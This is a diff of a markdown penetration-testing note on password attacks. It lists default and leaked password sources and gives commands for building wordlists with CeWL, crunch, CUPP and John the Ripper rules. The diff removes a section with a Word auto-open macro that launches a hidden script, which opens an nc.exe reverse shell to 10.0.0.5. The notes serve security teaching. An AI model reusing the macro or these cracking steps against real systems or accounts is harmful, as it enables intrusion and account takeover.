@@ -8,23 +8,27 @@ We will also speak about tools used to perform online and offline password attac
 ## Practice
 ### Default Passwords
 Here are some website lists that provide default passwords for various products.
-1 - [Cirt.net](https://cirt.net/passwords)  
-2 - [Default-password](https://default-password.info/)
-3 - [Datarecovery](https://datarecovery.com/rd/default-passwords/) 
+1 - [Cirt.net](https://cirt.net/passwords)
+2 - [Default-password](https://default-password.info/)  
+3 - [Datarecovery](https://datarecovery.com/rd/default-passwords/)
 
 ### Leaked Passwords
 Here are some website and tools that provide ressources about leaked passwords.
-1 - [PwnedOrNot](https://github.com/thewhiteh4t/pwnedOrNot)
-2 - [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)
+1 - [PwnedOrNot](https://github.com/thewhiteh4t/pwnedOrNot)  
+2 - [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)  
 
-### Wordlist from website content
+### Generate a Wordlist
+{% tabs %}
+
+{% tab title="CeWL - From a Website" %}
 CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.
 
 ```bash
 cewl -w list.txt -d 5 -m 5 http://target.net
 ```
+{% endtab %}
 
-### Generate User List
+{% tab title="User List" %}
 Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames.  
 
 Thankfully, there is a tool [username_generator](https://github.com/therodri2/username_generator.git) that could help create a list with most of the possible combinations if we have a first name and last name.
@@ -32,8 +36,8 @@ Thankfully, there is a tool [username_generator](https://github.com/therodri2/us
 ```bash
 python3 username_generator.py -w users.lst
 ```
-
-### Crunch - Generate Password list
+{% endtab %}
+{% tab title="Crunch" %}
 crunch is one of many powerful tools for creating an offline wordlist. With crunch, we can specify numerous options, including min, max, and options
 
 ```bash
@@ -43,22 +47,22 @@ crunch 2 2 01234abcd -o crunch.txt
 
 Crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:
 
-[@] - lower case alpha characters
+@ - lower case alpha characters
 
-[,] - upper case alpha characters
+, - upper case alpha characters
 
-[%] - numeric characters
+% - numeric characters
 
-[^] - special characters including space
+^ - special characters including space
 
 ```bash
 #min=6 max=6 option=pass[0-9][0-9] outfile=stdin
 crunch 6 6 -t pass%%
 ```
+{% endtab %}
 
-### CUPP - Common User Passwords Profiler (OSINT)
-
-[CUPP](https://github.com/Mebus/cupp) is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information.
+{% tab title="CUPP - OSINT" %}
+[CUPP - Common User Passwords Profiler](https://github.com/Mebus/cupp) is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information.
 
 ```bash
 #Interactive mod
@@ -70,35 +74,21 @@ python3 cupp.py -l
 # Alecto database default logins
 python3 cupp.py -a
 ```
-
-{% tabs %}
-
-{% tab title="Basic Usage" %}
-
-1 - Create new word document (CTRL+N)  
-2 - Hit ALT+F11 to go into Macro editor  
-3 - Double click into the "This document" and CTRL+C/V the below:  
-
-```bash
-#Macro
-Private Sub Document_Open()
-  MsgBox "game over", vbOKOnly, "game over"
-  a = Shell("C:\tools\shell.cmd", vbHide)
-End Sub
-```
-
-```bash
-#C:\tools\shell.cmd
-C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
-```
-
-4 - ALT+F11 to switch back to the document editing mode  
-5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.    
-
-
 {% endtab %}
 
+{% tab title="Ruled-Based" %}
+
+Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy — for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on.
+
+[John the ripper](https://github.com/openwall/john) has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:
+
+```bash
+john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
+```
+
+{% endtab %}
 {% endtabs %}
+
 
 ## Resources
 
